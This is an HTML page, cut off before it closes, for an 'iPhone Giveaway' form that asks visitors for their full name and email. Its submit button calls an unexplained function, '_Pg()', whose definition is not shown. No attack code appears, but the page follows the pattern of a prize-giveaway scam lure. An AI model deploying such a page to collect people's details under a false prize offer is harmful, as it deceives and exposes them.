<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Giveaway</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .card-img-top {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-bottom: 1px solid #ddd;
            border-radius: 30px 30px 0 0;
        }

        /* iPhone-like card styling */
        .iphone-card {
            border: 12px solid #f0f0f0;
            border-radius: 30px;
            background-color: #f0f0f0;
        }

        .iphone-card .card-header {
            background-color: #f8f8f8;
            border: none;
            border-bottom: 1px solid #ddd;
            border-radius: 30px 30px 0 0;
            overflow: hidden;
        }

        .iphone-card .card-body {
            border-radius: 0 0 30px 30px;
        }

        .iphone-card .btn-primary {
            border-radius: 20px;
        }

        /* Additional form styling */
        .form-group label {
            font-weight: bold;
        }

        .form-control {
            border-radius: 20px;
        }
    </style>
</head>
<body>

<div class="container mt-5 text-center">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card iphone-card">
                <div class="card-header">
                    <img src="https://logos-world.net/wp-content/uploads/2022/01/iPhone-Symbol.png" class="card-img-top" alt="Cool Image">
                    <h2 class="text-center">iPhone Giveaway</h2>
                </div>
                <div class="card-body">
                    <p class="lead text-center text-danger font-weight-bold">Enter the giveaway for a chance to win a brand new iPhone!</p>
                    <form id="giveawayForm" action="#" method="post">
                        <div class="form-group">
                            <label for="fullName">Full Name</label>
                            <input type="text" class="form-control" id="fullName" name="fullName" required>
                        </div>
                        <div class="form-group">
                            <label for="email">Email Address</label>
                            <input type="email" class="form-control" id="email" name="email" required>
                        </div>
                        <button type="submit" class="btn btn-info btn-block rounded-pill" onclick="_Pg()">Enter Giveaway</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
